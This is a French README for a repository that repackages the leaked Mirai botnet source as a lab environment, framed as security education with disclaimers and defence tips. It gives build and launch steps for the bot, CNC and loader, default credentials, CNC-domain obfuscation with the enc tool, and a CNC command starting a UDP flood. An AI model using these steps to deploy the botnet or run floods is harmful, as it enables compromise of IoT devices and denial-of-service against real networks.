# 🔬 Mirai Botnet - Home Lab Testing Environment

[![Security Research](https://img.shields.io/badge/Purpose-Security%20Research-red)]()
[![Educational](https://img.shields.io/badge/Use-Educational%20Only-yellow)]()
[![License](https://img.shields.io/badge/License-MIT-blue)]()

**Analyse complète du code source Mirai pour apprentissage et tests en environnement contrôlé**

> **⚠️ AVERTISSEMENT LÉGAL**: Ce projet est destiné UNIQUEMENT à la recherche en sécurité et aux tests en environnement isolé. L'utilisation de ce code pour attaquer des systèmes sans autorisation est ILLÉGALE.

---

## 📚 Documentation Complète

Ce repository contient le code source historique du botnet Mirai avec une documentation modernisée:

### 🚀 Guides de Démarrage
- **[QUICKSTART.md](QUICKSTART.md)** - Guide rapide pour démarrer (30 minutes)
- **[DOCKER.md](DOCKER.md)** - Setup Docker pour tests isolés (RECOMMANDÉ)
- **[ANALYSIS.md](ANALYSIS.md)** - Analyse technique approfondie

### 📖 Documentation Originale
- **[README.md](README.md)** - Instructions originales
- **[ForumPost.md](ForumPost.md)** - Post original du leak avec détails techniques

---

## 🎯 Qu'est-ce que Mirai?

Mirai est un **botnet IoT historique** qui a causé des DDoS massifs en 2016 (attaque Krebs, Dyn DNS). Le code a été leaked publiquement et est devenu une référence pour:

- 🔍 **Recherche en sécurité IoT**
- 🎓 **Formation en cybersécurité**
- 🛡️ **Développement de défenses**
- 📊 **Analyse de malware**

### Architecture

```
┌─────────────────────────────────────────────────┐
│                 Home Lab Setup                   │
├─────────────────────────────────────────────────┤
│                                                  │
│  ┌──────────┐    ┌───────────┐   ┌──────────┐ │
│  │   Bot    │───▶│    CNC    │◀──│  Admin   │ │
│  │(Malware) │    │ (Command) │   │(Telnet)  │ │
│  └──────────┘    └─────┬─────┘   └──────────┘ │
│       │                │                        │
│       │          ┌─────┴──────┐                │
│       │          │   MySQL    │                │
│       │          │ (Database) │                │
│       │          └────────────┘                │
│       │                                         │
│       ▼                                         │
│  ┌──────────┐    ┌──────────┐                 │
│  │ Scanner  │───▶│ Loader   │                 │
│  │(Telnet)  │    │(Deploy)  │                 │
│  └──────────┘    └──────────┘                 │
│                                                  │
└─────────────────────────────────────────────────┘
```

---

## 🚀 Démarrage Rapide

### Option 1: Docker (Recommandé) 🐳

**Le plus simple et le plus sûr - environnement complètement isolé**

```bash
# 1. Cloner le repo (déjà fait)
cd /home/runner/work/Mirai-Source-Code/Mirai-Source-Code

# 2. Démarrer tous les services
docker-compose up -d --build

# 3. Se connecter au CNC
telnet localhost 23
# Login: admin / password123

# 4. Voir la documentation Docker complète
cat DOCKER.md
```

✅ **Avantages Docker:**
- Isolation complète
- Pas d'installation de dépendances sur votre système
- Cleanup facile
- Environnement reproductible

### Option 2: Installation Manuelle

**Pour comprendre le fonctionnement en détail**

```bash
# 1. Installer les dépendances
sudo apt-get update
sudo apt-get install -y gcc golang electric-fence mysql-server

# 2. Configurer la base de données
sudo mysql < scripts/db.sql
sudo mysql mirai -e "INSERT INTO users VALUES (NULL, 'admin', 'password123', 0, 0, 0, 0, -1, 1, 30, '');"

# 3. Builder les composants
cd mirai
./build-modern.sh --mode debug --type telnet

# 4. Lancer le CNC
./debug/cnc

# 5. Documentation complète
cat QUICKSTART.md
```

---

## 📁 Structure du Projet

```
Mirai-Source-Code/
│
├── 📖 Documentation/
│   ├── QUICKSTART.md          # Guide de démarrage rapide
│   ├── DOCKER.md              # Setup Docker complet
│   ├── ANALYSIS.md            # Analyse technique détaillée
│   └── README-FR.md           # Ce fichier
│
├── 🤖 Composants Principaux/
│   ├── mirai/bot/             # Code du malware (C)
│   ├── mirai/cnc/             # Serveur de commande (Go)
│   ├── mirai/tools/           # Outils utilitaires
│   └── loader/                # Chargeur de malware (C)
│
├── 🔧 Configuration/
│   ├── docker-compose.yml     # Setup Docker
│   ├── Dockerfile.*           # Images Docker
│   └── scripts/               # Scripts de configuration
│
└── 🛠️ Build/
    ├── mirai/build.sh         # Script de build original
    ├── mirai/build-modern.sh  # Script modernisé
    └── loader/build.sh        # Build du loader
```

---

## 🎓 Ce que Vous Pouvez Apprendre

### 1. Sécurité IoT
- Comment les devices IoT sont compromis
- Techniques de brute-force Telnet/SSH
- Vulnérabilités des mots de passe par défaut
- Mécanismes de propagation

### 2. Architecture Botnet
- Communication C&C (Command & Control)
- Protocoles binaires custom
- Gestion distribuée de bots
- Coordination d'attaques DDoS

### 3. Techniques de Malware
- Obfuscation de code
- Anti-debugging
- Persistance système
- Cross-compilation pour architectures diverses

### 4. Attaques DDoS
- UDP flood
- TCP SYN flood
- HTTP flood
- GRE attacks
- Volumetric attacks

### 5. Développement Sécurisé
- Ce qu'il NE faut PAS faire
- Vulnérabilités courantes
- Hardening de systèmes
- Détection d'intrusions

---

## 🛠️ Composants Détaillés

### 🤖 Bot (Malware)
**Langage:** C  
**Architectures:** ARM, MIPS, x86, PowerPC, SPARC, M68K, SH4

**Fonctionnalités:**
- ✅ Connexion au serveur CNC
- ✅ Exécution d'attaques DDoS
- ✅ Scan de devices vulnérables
- ✅ Auto-propagation
- ✅ Élimination de malware concurrent
- ✅ Obfuscation de configuration

**Fichiers clés:**
```
mirai/bot/
├── main.c          # Point d'entrée
├── attack*.c       # Implémentations d'attaques
├── scanner.c       # Scanner Telnet/SSH
├── killer.c        # Tue les malwares concurrents
├── table.c/h       # Configuration obfusquée
└── resolv.c        # Résolution DNS
```

### 🎛️ CNC (Command & Control)
**Langage:** Go  
**Ports:** 23 (Telnet), 101 (API)

**Fonctionnalités:**
- ✅ Interface admin via Telnet
- ✅ Gestion des bots connectés
- ✅ Commandes d'attaque
- ✅ Historique dans MySQL
- ✅ API REST
- ✅ Multi-utilisateurs

**Fichiers clés:**
```
mirai/cnc/
├── main.go         # Serveur principal
├── admin.go        # Interface admin
├── attack.go       # Coordination d'attaques
├── database.go     # Interaction MySQL
├── api.go          # API REST
└── bot.go          # Gestion des bots
```

### 📥 Loader
**Langage:** C  
**Port:** 48101 (réception), 8080 (serveur HTTP)

**Fonctionnalités:**
- ✅ Réception de credentials brute-forcées
- ✅ Connexion automatique aux cibles
- ✅ Upload de malware
- ✅ Détection d'architecture
- ✅ Echo-loading si wget/tftp absent

### 🔍 Scanner Listener
**Langage:** Go  
**Port:** 48101

**Fonctionnalités:**
- ✅ Réception de résultats de scan
- ✅ Transmission au loader
- ✅ Real-time loading

---

## 🔧 Configuration

### Configuration du Bot (`mirai/bot/table.c`)

Les valeurs sont obfusquées par XOR. Utiliser l'outil `enc`:

```bash
cd mirai/debug
./enc string "mon-domaine-cnc.com"
# Output: \x44\x57\x41... (copier dans table.c)
```

**Valeurs importantes:**
- `TABLE_CNC_DOMAIN` - Domaine du CNC
- `TABLE_CNC_PORT` - Port du CNC (23)
- `TABLE_SCAN_CB_DOMAIN` - Domaine callback scan
- `TABLE_SCAN_CB_PORT` - Port callback (48101)

### Configuration du CNC (`mirai/cnc/main.go`)

```go
const DatabaseAddr string   = "127.0.0.1"    // IP MySQL
const DatabaseUser string   = "root"          // User MySQL
const DatabasePass string   = "password"      // Pass MySQL
const DatabaseTable string  = "mirai"         // DB name
```

---

## 🧪 Scénarios de Test

### 1. Test de Connexion Bot ↔ CNC
```bash
# Terminal 1: Lancer CNC
./debug/cnc

# Terminal 2: Lancer Bot
./debug/mirai.dbg

# Terminal 3: Vérifier connexion
telnet localhost 23
> login admin password123
> bots
# Devrait afficher le bot connecté
```

### 2. Test d'Attaque DDoS (Contre Votre Serveur)
```bash
# Dans telnet CNC:
> udp 192.168.1.100 60 512 80
# Attaque UDP de 60s contre votre serveur de test

# Monitorer avec:
tcpdump -i any port 80
```

### 3. Test de Scan (Réseau Isolé)
```bash
# Le bot va scanner automatiquement
# Voir les résultats:
./debug/scanListen 48101
```

---

## 🔒 Considérations de Sécurité

### ⚠️ NE JAMAIS
- ❌ Utiliser sur des réseaux publics
- ❌ Attaquer des systèmes non autorisés
- ❌ Exposer à Internet
- ❌ Utiliser en production
- ❌ Partager avec des personnes malveillantes

### ✅ TOUJOURS
- ✅ Utiliser dans un environnement isolé
- ✅ Tester uniquement sur vos devices
- ✅ Monitorer votre réseau
- ✅ Documenter vos expériences
- ✅ Apprendre pour défendre

### 🛡️ Défenses à Implémenter

Après avoir compris Mirai, implémentez:

1. **Détection IDS/IPS**
   - Signatures de scan Telnet
   - Patterns de trafic DDoS
   - Connexions suspectes

2. **Hardening IoT**
   - Changer mots de passe par défaut
   - Désactiver Telnet/SSH si inutile
   - Firewall restrictif
   - Mises à jour régulières

3. **Monitoring Réseau**
   - Alertes sur scans
   - Analyse de trafic
   - Honeypots

---

## 🐛 Dépannage

### CNC ne démarre pas
```bash
# Vérifier MySQL
sudo service mysql status
sudo mysql -e "SHOW DATABASES;"

# Vérifier port 23
sudo netstat -tulpn | grep :23

# Voir logs
./debug/cnc
```

### Bot ne se connecte pas
```bash
# Vérifier domain dans table.c
grep TABLE_CNC_DOMAIN mirai/bot/table.c

# Tester résolution DNS
ping -c 1 cnc.changeme.com

# Tester connexion
telnet localhost 23
```

### Build échoue
```bash
# Installer dépendances
sudo apt-get install gcc golang electric-fence

# Vérifier versions
gcc --version
go version

# Utiliser script modernisé
./build-modern.sh --help
```

---

## 📊 Ressources Supplémentaires

### Documentation
- [Analyse Technique Complète](ANALYSIS.md)
- [Guide Docker](DOCKER.md)
- [Quick Start](QUICKSTART.md)
- [Post Original](ForumPost.md)

### Articles de Référence
- [Krebs on Security - KrebsOnSecurity Hit With Record DDoS](https://krebsonsecurity.com/2016/09/krebsonsecurity-hit-with-record-ddos/)
- [MalwareMustDie Analysis](http://blog.malwaremustdie.org/2016/08/mmd-0056-2016-linuxmirai-just.html)
- [DDoS Attack on Dyn](https://en.wikipedia.org/wiki/2016_Dyn_cyberattack)

### Outils de Défense
- Fail2ban - Protection brute-force
- Suricata/Snort - IDS/IPS
- iptables/nftables - Firewall
- Wireshark - Analyse réseau

---

## 🤝 Contribution

Ce projet est pour l'éducation. Contributions bienvenues pour:

- 📚 Améliorer la documentation
- 🐛 Corriger bugs dans les scripts
- 🔧 Moderniser le build system
- 🐳 Améliorer Docker setup
- 🎓 Ajouter des exercices pédagogiques

**Ne contribuez PAS:**
- Code malveillant
- Techniques d'évasion améliorées
- Outils d'attaque automatisés

---

## 📜 License

Voir [LICENSE.md](LICENSE.md)

**Disclaimer:** Ce code est fourni "tel quel" pour recherche et éducation. Les auteurs ne sont pas responsables de l'utilisation malveillante.

---

## 🎯 Objectifs d'Apprentissage

Après avoir étudié ce projet, vous devriez comprendre:

✅ Comment fonctionnent les botnets IoT  
✅ Techniques de brute-force et propagation  
✅ Architecture client-serveur pour malware  
✅ Mécanismes d'attaques DDoS  
✅ Obfuscation et évasion  
✅ Cross-compilation embedded  
✅ Sécurisation de devices IoT  
✅ Détection et mitigation  

---

## 🆘 Support

Pour questions ou problèmes:

1. Lire la documentation complète
2. Vérifier les issues GitHub
3. Créer une issue avec:
   - Description du problème
   - Logs d'erreur
   - Environnement (OS, versions)
   - Ce que vous avez déjà essayé

---

## ⚖️ Avertissement Final

**CE CODE EST DANGEREUX ET ILLÉGAL SI MAL UTILISÉ**

En utilisant ce repository, vous acceptez:
- De l'utiliser UNIQUEMENT pour apprentissage
- Dans un environnement TOTALEMENT isolé
- Sur des systèmes dont vous êtes PROPRIÉTAIRE
- De ne JAMAIS l'utiliser pour attaquer

Les violations peuvent entraîner:
- Poursuites judiciaires
- Peines de prison
- Amendes importantes
- Interdiction professionnelle

**Restez éthique. Restez légal. Apprenez pour défendre.**

---

<div align="center">

**🔒 Pour la Sécurité. Pour l'Éducation. Pour la Défense. 🔒**

*Ce projet est dédié à tous les chercheurs en sécurité qui travaillent à rendre Internet plus sûr.*

</div>
